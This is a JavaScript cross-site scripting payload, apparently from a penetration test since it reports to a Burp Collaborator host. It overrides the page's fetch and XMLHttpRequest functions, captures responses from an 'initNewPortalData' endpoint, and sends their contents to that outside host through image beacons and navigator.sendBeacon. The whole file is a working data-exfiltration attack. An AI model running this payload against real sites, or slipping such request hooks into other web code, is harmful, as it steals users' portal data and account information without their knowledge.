// Fixed XSS Payload - Properly capture and exfiltrate API response
(function() {
  console.log('[PAYLOAD STARTED]');
  
  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com';
  
  // Test 1: Simple ping to verify payload loads
  (new Image()).src = attackerServer + '/ping?status=loaded';
  
  // Intercept fetch globally
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    const urlStr = typeof url === 'string' ? url : url?.url || '';
    
    console.log('[FETCH]', urlStr);
    
    // Call original fetch
    return originalFetch.apply(this, args).then(response => {
      // Clone response so we can read it
      const cloned = response.clone();
      
      // Check if this is the endpoint we want
      if (urlStr.includes('initNewPortalData')) {
        console.log('[TARGET HIT] initNewPortalData');
        
        // Read response body
        cloned.text().then(text => {
          console.log('[RESPONSE TEXT]', text);
          
          // Try to parse as JSON
          try {
            const data = JSON.parse(text);
            console.log('[PARSED JSON]', data);
            
            // Send the data
            sendData(data);
          } catch(e) {
            console.log('[NOT JSON] Sending as text');
            sendData({ rawResponse: text });
          }
        }).catch(err => {
          console.log('[ERROR reading response]', err);
        });
      }
      
      // Return original response unchanged
      return response;
    }).catch(err => {
      console.log('[FETCH ERROR]', err);
      return originalFetch.apply(this, args);
    });
  };
  
  // Intercept XMLHttpRequest
  const originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    console.log('[XHR]', method, url);
    
    if (url && url.includes('initNewPortalData')) {
      console.log('[TARGET HIT] initNewPortalData via XHR');
      
      // Intercept the response
      const originalOnload = this.onload;
      const self = this;
      
      this.onload = function() {
        console.log('[XHR RESPONSE]', this.responseText);
        
        try {
          const data = JSON.parse(this.responseText);
          console.log('[PARSED XHR]', data);
          sendData(data);
        } catch(e) {
          console.log('[NOT JSON] Sending as text');
          sendData({ rawResponse: this.responseText });
        }
        
        if (originalOnload) {
          return originalOnload.call(this);
        }
      };
    }
    
    return originalOpen.apply(this, arguments);
  };
  
  // Function to actually send data to Burp
  function sendData(data) {
    console.log('[SENDING DATA]', data);
    
    // Method 1: Image beacon (always works, no CORS issues)
    const beacon = new Image();
    beacon.src = attackerServer + '/exfil?data=' + encodeURIComponent(JSON.stringify(data));
    console.log('[SENT VIA IMAGE]');
    
    // Method 2: Navigator.sendBeacon (reliable)
    if (navigator.sendBeacon) {
      try {
        navigator.sendBeacon(
          attackerServer + '/beacon',
          JSON.stringify(data)
        );
        console.log('[SENT VIA BEACON]');
      } catch(e) {
        console.log('[BEACON ERROR]', e);
      }
    }
    
    // Method 3: Store in window for manual verification
    window.capturedData = data;
    console.log('[STORED IN] window.capturedData');
  }
  
  console.log('[PAYLOAD READY] Waiting for API calls...');
  
})();
